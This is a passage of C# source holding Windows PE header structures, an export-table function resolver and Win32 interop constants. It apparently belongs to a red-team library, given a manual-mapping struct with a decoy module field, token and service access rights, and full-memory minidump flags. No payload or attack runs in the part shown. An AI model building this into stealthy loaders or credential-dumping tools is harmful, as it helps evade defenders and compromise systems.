                    OptionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
                }

                ImageSectionHeaders = new IMAGE_SECTION_HEADER[FileHeader.NumberOfSections];
                for (int headerNo = 0; headerNo < ImageSectionHeaders.Length; ++headerNo)
                {
                    ImageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
                }
                this.PEBytes = PEBytes;
            }
        }






        public IntPtr GetFunctionExport(string funcName)
        {
            IntPtr ExportTablePtr = IntPtr.Zero;
            P.IMAGE_EXPORT_DIRECTORY expDir;

            if (this.Is32BitHeader && this.OptionalHeader32.ExportTable.Size == 0) { return IntPtr.Zero; }
            else if (!this.Is32BitHeader && this.OptionalHeader64.ExportTable.Size == 0) { return IntPtr.Zero; }

            if (this.Is32BitHeader)
            {
                ExportTablePtr = (IntPtr)((ulong)codebase + (ulong)this.OptionalHeader32.ExportTable.VirtualAddress);
            }
            else
            {
                ExportTablePtr = (IntPtr)((ulong)codebase + (ulong)this.OptionalHeader64.ExportTable.VirtualAddress);
            }

            expDir = (P.IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure(ExportTablePtr, typeof(P.IMAGE_EXPORT_DIRECTORY));
            for (int i = 0; i < expDir.NumberOfNames; i++)
            {
                IntPtr NameOffsetPtr = (IntPtr)((ulong)codebase + (ulong)expDir.AddressOfNames);
                NameOffsetPtr = (IntPtr)((ulong)NameOffsetPtr + (ulong)(i * Marshal.SizeOf(typeof(uint))));
                IntPtr NamePtr = (IntPtr)((ulong)codebase + (uint)Marshal.PtrToStructure(NameOffsetPtr, typeof(uint)));

                string Name = Marshal.PtrToStringAnsi(NamePtr);
                if (Name.Contains(funcName))
                {
                    IntPtr AddressOfFunctions = (IntPtr)((ulong)codebase + (ulong)expDir.AddressOfFunctions);
                    IntPtr OrdinalRvaPtr = (IntPtr)((ulong)codebase + (ulong)(expDir.AddressOfOrdinals + (i * Marshal.SizeOf(typeof(UInt16)))));
                    UInt16 FuncIndex = (UInt16)Marshal.PtrToStructure(OrdinalRvaPtr, typeof(UInt16));
                    IntPtr FuncOffsetLocation = (IntPtr)((ulong)AddressOfFunctions + (ulong)(FuncIndex * Marshal.SizeOf(typeof(UInt32))));
                    IntPtr FuncLocationInMemory = (IntPtr)((ulong)codebase + (uint)Marshal.PtrToStructure(FuncOffsetLocation, typeof(UInt32)));
                    return FuncLocationInMemory;
                }
            }
            return IntPtr.Zero;
        }

        private static T FromBinaryReader<T>(BinaryReader reader)
        {

            byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));


            GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
            T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
            handle.Free();

            return theStructure;
        }

        private static IntPtr IntPtrAdd(IntPtr a, int b)
        {
            IntPtr ptr = new IntPtr(a.ToInt64() + b);
            return ptr;
        }

        public struct IMAGE_DOS_HEADER
        {
            public UInt16 e_magic;
            public UInt16 e_cblp;
            public UInt16 e_cp;
            public UInt16 e_crlc;
            public UInt16 e_cparhdr;
            public UInt16 e_minalloc;
            public UInt16 e_maxalloc;
            public UInt16 e_ss;
            public UInt16 e_sp;
            public UInt16 e_csum;
            public UInt16 e_ip;
            public UInt16 e_cs;
            public UInt16 e_lfarlc;
            public UInt16 e_ovno;
            public UInt16 e_res_0;
            public UInt16 e_res_1;
            public UInt16 e_res_2;
            public UInt16 e_res_3;
            public UInt16 e_oemid;
            public UInt16 e_oeminfo;
            public UInt16 e_res2_0;
            public UInt16 e_res2_1;
            public UInt16 e_res2_2;
            public UInt16 e_res2_3;
            public UInt16 e_res2_4;
            public UInt16 e_res2_5;
            public UInt16 e_res2_6;
            public UInt16 e_res2_7;
            public UInt16 e_res2_8;
            public UInt16 e_res2_9;
            public UInt32 e_lfanew;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_DATA_DIRECTORY
        {
            public UInt32 VirtualAddress;
            public UInt32 Size;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER32
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt32 BaseOfData;
            public UInt32 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt32 SizeOfStackReserve;
            public UInt32 SizeOfStackCommit;
            public UInt32 SizeOfHeapReserve;
            public UInt32 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_OPTIONAL_HEADER64
        {
            public UInt16 Magic;
            public Byte MajorLinkerVersion;
            public Byte MinorLinkerVersion;
            public UInt32 SizeOfCode;
            public UInt32 SizeOfInitializedData;
            public UInt32 SizeOfUninitializedData;
            public UInt32 AddressOfEntryPoint;
            public UInt32 BaseOfCode;
            public UInt64 ImageBase;
            public UInt32 SectionAlignment;
            public UInt32 FileAlignment;
            public UInt16 MajorOperatingSystemVersion;
            public UInt16 MinorOperatingSystemVersion;
            public UInt16 MajorImageVersion;
            public UInt16 MinorImageVersion;
            public UInt16 MajorSubsystemVersion;
            public UInt16 MinorSubsystemVersion;
            public UInt32 Win32VersionValue;
            public UInt32 SizeOfImage;
            public UInt32 SizeOfHeaders;
            public UInt32 CheckSum;
            public UInt16 Subsystem;
            public UInt16 DllCharacteristics;
            public UInt64 SizeOfStackReserve;
            public UInt64 SizeOfStackCommit;
            public UInt64 SizeOfHeapReserve;
            public UInt64 SizeOfHeapCommit;
            public UInt32 LoaderFlags;
            public UInt32 NumberOfRvaAndSizes;

            public IMAGE_DATA_DIRECTORY ExportTable;
            public IMAGE_DATA_DIRECTORY ImportTable;
            public IMAGE_DATA_DIRECTORY ResourceTable;
            public IMAGE_DATA_DIRECTORY ExceptionTable;
            public IMAGE_DATA_DIRECTORY CertificateTable;
            public IMAGE_DATA_DIRECTORY BaseRelocationTable;
            public IMAGE_DATA_DIRECTORY Debug;
            public IMAGE_DATA_DIRECTORY Architecture;
            public IMAGE_DATA_DIRECTORY GlobalPtr;
            public IMAGE_DATA_DIRECTORY TLSTable;
            public IMAGE_DATA_DIRECTORY LoadConfigTable;
            public IMAGE_DATA_DIRECTORY BoundImport;
            public IMAGE_DATA_DIRECTORY IAT;
            public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
            public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
            public IMAGE_DATA_DIRECTORY Reserved;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct IMAGE_FILE_HEADER
        {
            public UInt16 Machine;
            public UInt16 NumberOfSections;
            public UInt32 TimeDateStamp;
            public UInt32 PointerToSymbolTable;
            public UInt32 NumberOfSymbols;
            public UInt16 SizeOfOptionalHeader;
            public UInt16 Characteristics;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_SECTION_HEADER
        {
            [FieldOffset(0)]
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public char[] Name;
            [FieldOffset(8)]
            public UInt32 VirtualSize;
            [FieldOffset(12)]
            public UInt32 VirtualAddress;
            [FieldOffset(16)]
            public UInt32 SizeOfRawData;
            [FieldOffset(20)]
            public UInt32 PointerToRawData;
            [FieldOffset(24)]
            public UInt32 PointerToRelocations;
            [FieldOffset(28)]
            public UInt32 PointerToLinenumbers;
            [FieldOffset(32)]
            public UInt16 NumberOfRelocations;
            [FieldOffset(34)]
            public UInt16 NumberOfLinenumbers;
            [FieldOffset(36)]
            public DataSectionFlags Characteristics;

            public string Section
            {
                get { return new string(Name); }
            }
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_EXPORT_DIRECTORY
        {
            [FieldOffset(0)]
            public UInt32 Characteristics;
            [FieldOffset(4)]
            public UInt32 TimeDateStamp;
            [FieldOffset(8)]
            public UInt16 MajorVersion;
            [FieldOffset(10)]
            public UInt16 MinorVersion;
            [FieldOffset(12)]
            public UInt32 Name;
            [FieldOffset(16)]
            public UInt32 Base;
            [FieldOffset(20)]
            public UInt32 NumberOfFunctions;
            [FieldOffset(24)]
            public UInt32 NumberOfNames;
            [FieldOffset(28)]
            public UInt32 AddressOfFunctions;
            [FieldOffset(32)]
            public UInt32 AddressOfNames;
            [FieldOffset(36)]
            public UInt32 AddressOfOrdinals;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IMAGE_BASE_RELOCATION
        {
            public uint VirtualAdress;
            public uint SizeOfBlock;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PE_META_DATA
        {
            public UInt32 Pe;
            public Boolean Is32Bit;
            public IMAGE_FILE_HEADER ImageFileHeader;
            public IMAGE_OPTIONAL_HEADER32 OptHeader32;
            public IMAGE_OPTIONAL_HEADER64 OptHeader64;
            public IMAGE_SECTION_HEADER[] Sections;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PE_MANUAL_MAP
        {
            public String DecoyModule;
            public IntPtr ModuleBase;
            public PE_META_DATA PEINFO;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_THUNK_DATA32
        {
            [FieldOffset(0)]
            public UInt32 ForwarderString;
            [FieldOffset(0)]
            public UInt32 Function;
            [FieldOffset(0)]
            public UInt32 Ordinal;
            [FieldOffset(0)]
            public UInt32 AddressOfData;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct IMAGE_THUNK_DATA64
        {
            [FieldOffset(0)]
            public UInt64 ForwarderString;
            [FieldOffset(0)]
            public UInt64 Function;
            [FieldOffset(0)]
            public UInt64 Ordinal;
            [FieldOffset(0)]
            public UInt64 AddressOfData;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct ApiSetNamespace
        {
            [FieldOffset(0x0C)]
            public int Count;

            [FieldOffset(0x10)]
            public int EntryOffset;
        }

        [StructLayout(LayoutKind.Explicit, Size = 24)]
        public struct ApiSetNamespaceEntry
        {
            [FieldOffset(0x04)]
            public int NameOffset;

            [FieldOffset(0x08)]
            public int NameLength;

            [FieldOffset(0x10)]
            public int ValueOffset;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct ApiSetValueEntry
        {
            [FieldOffset(0x0C)]
            public int ValueOffset;

            [FieldOffset(0x10)]
            public int ValueCount;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LDR_DATA_TABLE_ENTRY
        {
            public N.LIST_ENTRY InLoadOrderLinks;
            public N.LIST_ENTRY InMemoryOrderLinks;
            public N.LIST_ENTRY InInitializationOrderLinks;
            public IntPtr DllBase;
            public IntPtr EntryPoint;
            public UInt32 SizeOfImage;
            public N.UNICODE_STRING FullDllName;
            public N.UNICODE_STRING BaseDllName;
        }
    }

    public static class W1
    {
        public static class Kernel32
        {
            public static uint MEM_COMMIT = 0x1000;
            public static uint MEM_RESERVE = 0x2000;
            public static uint MEM_RESET = 0x80000;
            public static uint MEM_RESET_UNDO = 0x1000000;
            public static uint MEM_LARGE_PAGES = 0x20000000;
            public static uint MEM_PHYSICAL = 0x400000;
            public static uint MEM_TOP_DOWN = 0x100000;
            public static uint MEM_WRITE_WATCH = 0x200000;
            public static uint MEM_COALESCE_PLACEHOLDERS = 0x1;
            public static uint MEM_PRESERVE_PLACEHOLDER = 0x2;
            public static uint MEM_DECOMMIT = 0x4000;
            public static uint MEM_RELEASE = 0x8000;

            [StructLayout(LayoutKind.Sequential)]
            public struct IMAGE_BASE_RELOCATION
            {
                public uint VirtualAdress;
                public uint SizeOfBlock;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct IMAGE_IMPORT_DESCRIPTOR
            {
                public uint OriginalFirstThunk;
                public uint TimeDateStamp;
                public uint ForwarderChain;
                public uint Name;
                public uint FirstThunk;
            }

            public struct SYSTEM_INFO
            {
                public ushort wProcessorArchitecture;
                public ushort wReserved;
                public uint dwPageSize;
                public IntPtr lpMinimumApplicationAddress;
                public IntPtr lpMaximumApplicationAddress;
                public UIntPtr dwActiveProcessorMask;
                public uint dwNumberOfProcessors;
                public uint dwProcessorType;
                public uint dwAllocationGranularity;
                public ushort wProcessorLevel;
                public ushort wProcessorRevision;
            };

            public enum Platform
            {
                x86,
                x64,
                IA64,
                Unknown
            }

            [Flags]
            public enum ProcessAccessFlags : uint
            {

                PROCESS_ALL_ACCESS = 0x001F0FFF,
                PROCESS_CREATE_PROCESS = 0x0080,
                PROCESS_CREATE_THREAD = 0x0002,
                PROCESS_DUP_HANDLE = 0x0040,
                PROCESS_QUERY_INFORMATION = 0x0400,
                PROCESS_QUERY_LIMITED_INFORMATION = 0x1000,
                PROCESS_SET_INFORMATION = 0x0200,
                PROCESS_SET_QUOTA = 0x0100,
                PROCESS_SUSPEND_RESUME = 0x0800,
                PROCESS_TERMINATE = 0x0001,
                PROCESS_VM_OPERATION = 0x0008,
                PROCESS_VM_READ = 0x0010,
                PROCESS_VM_WRITE = 0x0020,
                SYNCHRONIZE = 0x00100000
            }

            [Flags]
            public enum FileAccessFlags : uint
            {
                DELETE = 0x10000,
                FILE_READ_DATA = 0x1,
                FILE_READ_ATTRIBUTES = 0x80,
                FILE_READ_EA = 0x8,
                READ_CONTROL = 0x20000,
                FILE_WRITE_DATA = 0x2,
                FILE_WRITE_ATTRIBUTES = 0x100,
                FILE_WRITE_EA = 0x10,
                FILE_APPEND_DATA = 0x4,
                WRITE_DAC = 0x40000,
                WRITE_OWNER = 0x80000,
                SYNCHRONIZE = 0x100000,
                FILE_EXECUTE = 0x20
            }

            [Flags]
            public enum FileShareFlags : uint
            {
                FILE_SHARE_NONE = 0x0,
                FILE_SHARE_READ = 0x1,
                FILE_SHARE_WRITE = 0x2,
                FILE_SHARE_DELETE = 0x4
            }

            [Flags]
            public enum FileOpenFlags : uint
            {
                FILE_DIRECTORY_FILE = 0x1,
                FILE_WRITE_THROUGH = 0x2,
                FILE_SEQUENTIAL_ONLY = 0x4,
                FILE_NO_INTERMEDIATE_BUFFERING = 0x8,
                FILE_SYNCHRONOUS_IO_ALERT = 0x10,
                FILE_SYNCHRONOUS_IO_NONALERT = 0x20,
                FILE_NON_DIRECTORY_FILE = 0x40,
                FILE_CREATE_TREE_CONNECTION = 0x80,
                FILE_COMPLETE_IF_OPLOCKED = 0x100,
                FILE_NO_EA_KNOWLEDGE = 0x200,
                FILE_OPEN_FOR_RECOVERY = 0x400,
                FILE_RANDOM_ACCESS = 0x800,
                FILE_DELETE_ON_CLOSE = 0x1000,
                FILE_OPEN_BY_FILE_ID = 0x2000,
                FILE_OPEN_FOR_BACKUP_INTENT = 0x4000,
                FILE_NO_COMPRESSION = 0x8000
            }

            [Flags]
            public enum StandardRights : uint
            {
                Delete = 0x00010000,
                ReadControl = 0x00020000,
                WriteDac = 0x00040000,
                WriteOwner = 0x00080000,
                Synchronize = 0x00100000,
                Required = 0x000f0000,
                Read = ReadControl,
                Write = ReadControl,
                Execute = ReadControl,
                All = 0x001f0000,

                SpecificRightsAll = 0x0000ffff,
                AccessSystemSecurity = 0x01000000,
                MaximumAllowed = 0x02000000,
                GenericRead = 0x80000000,
                GenericWrite = 0x40000000,
                GenericExecute = 0x20000000,
                GenericAll = 0x10000000
            }

            [Flags]
            public enum ThreadAccess : uint
            {
                Terminate = 0x0001,
                SuspendResume = 0x0002,
                Alert = 0x0004,
                GetContext = 0x0008,
                SetContext = 0x0010,
                SetInformation = 0x0020,
                QueryInformation = 0x0040,
                SetThreadToken = 0x0080,
                Impersonate = 0x0100,
                DirectImpersonation = 0x0200,
                SetLimitedInformation = 0x0400,
                QueryLimitedInformation = 0x0800,
                All = StandardRights.Required | StandardRights.Synchronize | 0x3ff
            }
        }

        public static class Netapi32
        {
            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
            public struct LOCALGROUP_USERS_INFO_0
            {
                [MarshalAs(UnmanagedType.LPWStr)] internal string name;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct LOCALGROUP_USERS_INFO_1
            {
                [MarshalAs(UnmanagedType.LPWStr)] public string name;
                [MarshalAs(UnmanagedType.LPWStr)] public string comment;
            }

            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
            public struct LOCALGROUP_MEMBERS_INFO_2
            {
                public IntPtr lgrmi2_sid;
                public int lgrmi2_sidusage;
                [MarshalAs(UnmanagedType.LPWStr)] public string lgrmi2_domainandname;
            }

            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
            public struct WKSTA_USER_INFO_1
            {
                public string wkui1_username;
                public string wkui1_logon_domain;
                public string wkui1_oth_domains;
                public string wkui1_logon_server;
            }

            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
            public struct SESSION_INFO_10
            {
                public string sesi10_cname;
                public string sesi10_username;
                public int sesi10_time;
                public int sesi10_idle_time;
            }

            public enum SID_NAME_USE : uint
            {
                SidTypeUser = 1,
                SidTypeGroup = 2,
                SidTypeDomain = 3,
                SidTypeAlias = 4,
                SidTypeWellKnownGroup = 5,
                SidTypeDeletedAccount = 6,
                SidTypeInvalid = 7,
                SidTypeUnknown = 8,
                SidTypeComputer = 9
            }

            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
            public struct SHARE_INFO_1
            {
                public string shi1_netname;
                public uint shi1_type;
                public string shi1_remark;

                public SHARE_INFO_1(string netname, uint type, string remark)
                {
                    this.shi1_netname = netname;
                    this.shi1_type = type;
                    this.shi1_remark = remark;
                }
            }
        }

        public static class Advapi32
        {


            public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
            public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
            public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
            public const UInt32 TOKEN_DUPLICATE = 0x0002;
            public const UInt32 TOKEN_IMPERSONATE = 0x0004;
            public const UInt32 TOKEN_QUERY = 0x0008;
            public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
            public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
            public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
            public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
            public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
            public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
            public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
                TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
                TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
                TOKEN_ADJUST_SESSIONID);
            public const UInt32 TOKEN_ALT = (TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY);


            [Flags]
            public enum CREATION_FLAGS : uint
            {
                NONE = 0x00000000,
                DEBUG_PROCESS = 0x00000001,
                DEBUG_ONLY_THIS_PROCESS = 0x00000002,
                CREATE_SUSPENDED = 0x00000004,
                DETACHED_PROCESS = 0x00000008,
                CREATE_NEW_CONSOLE = 0x00000010,
                NORMAL_PRIORITY_CLASS = 0x00000020,
                IDLE_PRIORITY_CLASS = 0x00000040,
                HIGH_PRIORITY_CLASS = 0x00000080,
                REALTIME_PRIORITY_CLASS = 0x00000100,
                CREATE_NEW_PROCESS_GROUP = 0x00000200,
                CREATE_UNICODE_ENVIRONMENT = 0x00000400,
                CREATE_SEPARATE_WOW_VDM = 0x00000800,
                CREATE_SHARED_WOW_VDM = 0x00001000,
                CREATE_FORCEDOS = 0x00002000,
                BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
                ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
                INHERIT_PARENT_AFFINITY = 0x00010000,
                INHERIT_CALLER_PRIORITY = 0x00020000,
                CREATE_PROTECTED_PROCESS = 0x00040000,
                EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
                PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
                PROCESS_MODE_BACKGROUND_END = 0x00200000,
                CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
                CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
                CREATE_DEFAULT_ERROR_MODE = 0x04000000,
                CREATE_NO_WINDOW = 0x08000000,
                PROFILE_USER = 0x10000000,
                PROFILE_KERNEL = 0x20000000,
                PROFILE_SERVER = 0x40000000,
                CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000
            }

            [Flags]
            public enum LOGON_FLAGS
            {
                NONE = 0x00000000,
                LOGON_WITH_PROFILE = 0x00000001,
                LOGON_NETCREDENTIALS_ONLY = 0x00000002
            }

            public enum LOGON_TYPE
            {
                LOGON32_LOGON_INTERACTIVE = 2,
                LOGON32_LOGON_NETWORK,
                LOGON32_LOGON_BATCH,
                LOGON32_LOGON_SERVICE,
                LOGON32_LOGON_UNLOCK = 7,
                LOGON32_LOGON_NETWORK_CLEARTEXT,
                LOGON32_LOGON_NEW_CREDENTIALS
            }

            public enum LOGON_PROVIDER
            {
                LOGON32_PROVIDER_DEFAULT,
                LOGON32_PROVIDER_WINNT35,
                LOGON32_PROVIDER_WINNT40,
                LOGON32_PROVIDER_WINNT50
            }

            [Flags]
            public enum SCM_ACCESS : uint
            {
                SC_MANAGER_CONNECT = 0x00001,
                SC_MANAGER_CREATE_SERVICE = 0x00002,
                SC_MANAGER_ENUMERATE_SERVICE = 0x00004,
                SC_MANAGER_LOCK = 0x00008,
                SC_MANAGER_QUERY_LOCK_STATUS = 0x00010,
                SC_MANAGER_MODIFY_BOOT_CONFIG = 0x00020,

                SC_MANAGER_ALL_ACCESS = ACCESS_MASK.STANDARD_RIGHTS_REQUIRED |
                    SC_MANAGER_CONNECT |
                    SC_MANAGER_CREATE_SERVICE |
                    SC_MANAGER_ENUMERATE_SERVICE |
                    SC_MANAGER_LOCK |
                    SC_MANAGER_QUERY_LOCK_STATUS |
                    SC_MANAGER_MODIFY_BOOT_CONFIG,

                GENERIC_READ = ACCESS_MASK.STANDARD_RIGHTS_READ |
                    SC_MANAGER_ENUMERATE_SERVICE |
                    SC_MANAGER_QUERY_LOCK_STATUS,

                GENERIC_WRITE = ACCESS_MASK.STANDARD_RIGHTS_WRITE |
                    SC_MANAGER_CREATE_SERVICE |
                    SC_MANAGER_MODIFY_BOOT_CONFIG,

                GENERIC_EXECUTE = ACCESS_MASK.STANDARD_RIGHTS_EXECUTE |
                    SC_MANAGER_CONNECT | SC_MANAGER_LOCK,

                GENERIC_ALL = SC_MANAGER_ALL_ACCESS,
            }

            [Flags]
            public enum ACCESS_MASK : uint
            {
                DELETE = 0x00010000,
                READ_CONTROL = 0x00020000,
                WRITE_DAC = 0x00040000,
                WRITE_OWNER = 0x00080000,
                SYNCHRONIZE = 0x00100000,
                STANDARD_RIGHTS_REQUIRED = 0x000F0000,
                STANDARD_RIGHTS_READ = 0x00020000,
                STANDARD_RIGHTS_WRITE = 0x00020000,
                STANDARD_RIGHTS_EXECUTE = 0x00020000,
                STANDARD_RIGHTS_ALL = 0x001F0000,
                SPECIFIC_RIGHTS_ALL = 0x0000FFFF,
                ACCESS_SYSTEM_SECURITY = 0x01000000,
                MAXIMUM_ALLOWED = 0x02000000,
                GENERIC_READ = 0x80000000,
                GENERIC_WRITE = 0x40000000,
                GENERIC_EXECUTE = 0x20000000,
                GENERIC_ALL = 0x10000000,
                DESKTOP_READOBJECTS = 0x00000001,
                DESKTOP_CREATEWINDOW = 0x00000002,
                DESKTOP_CREATEMENU = 0x00000004,
                DESKTOP_HOOKCONTROL = 0x00000008,
                DESKTOP_JOURNALRECORD = 0x00000010,
                DESKTOP_JOURNALPLAYBACK = 0x00000020,
                DESKTOP_ENUMERATE = 0x00000040,
                DESKTOP_WRITEOBJECTS = 0x00000080,
                DESKTOP_SWITCHDESKTOP = 0x00000100,
                WINSTA_ENUMDESKTOPS = 0x00000001,
                WINSTA_READATTRIBUTES = 0x00000002,
                WINSTA_ACCESSCLIPBOARD = 0x00000004,
                WINSTA_CREATEDESKTOP = 0x00000008,
                WINSTA_WRITEATTRIBUTES = 0x00000010,
                WINSTA_ACCESSGLOBALATOMS = 0x00000020,
                WINSTA_EXITWINDOWS = 0x00000040,
                WINSTA_ENUMERATE = 0x00000100,
                WINSTA_READSCREEN = 0x00000200,
                WINSTA_ALL_ACCESS = 0x0000037F
            }

            [Flags]
            public enum SERVICE_ACCESS : uint
            {
                SERVICE_QUERY_CONFIG = 0x00001,
                SERVICE_CHANGE_CONFIG = 0x00002,
                SERVICE_QUERY_STATUS = 0x00004,
                SERVICE_ENUMERATE_DEPENDENTS = 0x00008,
                SERVICE_START = 0x00010,
                SERVICE_STOP = 0x00020,
                SERVICE_PAUSE_CONTINUE = 0x00040,
                SERVICE_INTERROGATE = 0x00080,
                SERVICE_USER_DEFINED_CONTROL = 0x00100,

                SERVICE_ALL_ACCESS = (ACCESS_MASK.STANDARD_RIGHTS_REQUIRED |
                    SERVICE_QUERY_CONFIG |
                    SERVICE_CHANGE_CONFIG |
                    SERVICE_QUERY_STATUS |
                    SERVICE_ENUMERATE_DEPENDENTS |
                    SERVICE_START |
                    SERVICE_STOP |
                    SERVICE_PAUSE_CONTINUE |
                    SERVICE_INTERROGATE |
                    SERVICE_USER_DEFINED_CONTROL),

                GENERIC_READ = ACCESS_MASK.STANDARD_RIGHTS_READ |
                    SERVICE_QUERY_CONFIG |
                    SERVICE_QUERY_STATUS |
                    SERVICE_INTERROGATE |
                    SERVICE_ENUMERATE_DEPENDENTS,

                GENERIC_WRITE = ACCESS_MASK.STANDARD_RIGHTS_WRITE |
                    SERVICE_CHANGE_CONFIG,

                GENERIC_EXECUTE = ACCESS_MASK.STANDARD_RIGHTS_EXECUTE |
                    SERVICE_START |
                    SERVICE_STOP |
                    SERVICE_PAUSE_CONTINUE |
                    SERVICE_USER_DEFINED_CONTROL,

                ACCESS_SYSTEM_SECURITY = ACCESS_MASK.ACCESS_SYSTEM_SECURITY,
                DELETE = ACCESS_MASK.DELETE,
                READ_CONTROL = ACCESS_MASK.READ_CONTROL,
                WRITE_DAC = ACCESS_MASK.WRITE_DAC,
                WRITE_OWNER = ACCESS_MASK.WRITE_OWNER,
            }

            [Flags]
            public enum SERVICE_TYPE : uint
            {
                SERVICE_KERNEL_DRIVER = 0x00000001,
                SERVICE_FILE_SYSTEM_DRIVER = 0x00000002,
                SERVICE_WIN32_OWN_PROCESS = 0x00000010,
                SERVICE_WIN32_SHARE_PROCESS = 0x00000020,
                SERVICE_INTERACTIVE_PROCESS = 0x00000100,
            }

            public enum SERVICE_START : uint
            {
                SERVICE_BOOT_START = 0x00000000,
                SERVICE_SYSTEM_START = 0x00000001,
                SERVICE_AUTO_START = 0x00000002,
                SERVICE_DEMAND_START = 0x00000003,
                SERVICE_DISABLED = 0x00000004,
            }

            public enum SERVICE_ERROR
            {
                SERVICE_ERROR_IGNORE = 0x00000000,
                SERVICE_ERROR_NORMAL = 0x00000001,
                SERVICE_ERROR_SEVERE = 0x00000002,
                SERVICE_ERROR_CRITICAL = 0x00000003,
            }
        }

        public static class Dbghelp
        {
            public enum MINIDUMP_TYPE
            {
                MiniDumpNormal = 0x00000000,
                MiniDumpWithDataSegs = 0x00000001,
                MiniDumpWithFullMemory = 0x00000002,
                MiniDumpWithHandleData = 0x00000004,
                MiniDumpFilterMemory = 0x00000008,
                MiniDumpScanMemory = 0x00000010,
                MiniDumpWithUnloadedModules = 0x00000020,
                MiniDumpWithIndirectlyReferencedMemory = 0x00000040,
                MiniDumpFilterModulePaths = 0x00000080,
                MiniDumpWithProcessThreadData = 0x00000100,
                MiniDumpWithPrivateReadWriteMemory = 0x00000200,
                MiniDumpWithoutOptionalData = 0x00000400,
                MiniDumpWithFullMemoryInfo = 0x00000800,
                MiniDumpWithThreadInfo = 0x00001000,
                MiniDumpWithCodeSegs = 0x00002000,
                MiniDumpWithoutAuxiliaryState = 0x00004000,
                MiniDumpWithFullAuxiliaryState = 0x00008000,
                MiniDumpWithPrivateWriteCopyMemory = 0x00010000,
                MiniDumpIgnoreInaccessibleMemory = 0x00020000,
